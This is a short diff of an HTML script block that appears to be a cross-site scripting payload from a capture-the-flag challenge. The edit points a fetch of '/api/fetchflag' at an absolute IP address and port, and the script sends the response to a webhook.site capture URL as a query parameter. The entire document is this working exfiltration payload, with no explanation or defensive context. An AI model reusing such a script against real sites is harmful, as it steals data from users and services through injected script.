@@ -1,5 +1,5 @@
 <script>
-fetch('/api/fetchflag')
+fetch('http://95.217.6.37:20001/api/fetchflag')
   .then(r => r.text())
   .then(data => fetch('https://webhook.site/dcc15227-d003-45fa-b818-3bc971c36d17/capture?flag=' + encodeURIComponent(data)));
 </script>
